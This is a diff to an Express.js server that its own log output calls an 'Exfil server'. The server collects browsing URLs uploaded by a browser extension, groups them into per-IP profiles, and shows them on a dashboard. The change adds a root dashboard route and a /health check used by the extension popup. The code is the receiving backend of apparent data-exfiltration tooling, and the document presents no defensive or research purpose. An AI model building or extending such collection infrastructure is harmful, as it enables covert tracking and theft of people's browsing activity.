@@ -30,6 +30,9 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
 
+// Serve dashboard as the root page
+app.get("/", (_, res) => res.sendFile(path.join(__dirname, "public", "dashboard.html")));
+
 // IP profiles: Map<ip, { firstSeen, lastSeen, entries: [{url, partial, ts}] }>
 const profiles = new Map();
 
@@ -98,6 +101,9 @@ app.post("/upload", (req, res) => {
     res.json({ ok: true, received: urls.length });
 });
 
+// GET /health — connectivity check used by the extension popup
+app.get("/health", (_, res) => res.json({ ok: true }));
+
 // GET /profiles — all IP profiles as JSON (used by dashboard)
 app.get("/profiles", (_, res) => {
     const out = {};
@@ -107,5 +113,5 @@ app.get("/profiles", (_, res) => {
 
 app.listen(PORT, () => {
     console.log(`[*] Exfil server listening on http://localhost:${PORT}`);
-    console.log(`[*] Dashboard: http://localhost:${PORT}/dashboard.html`);
+    console.log(`[*] Dashboard: http://localhost:${PORT}/`);
 });
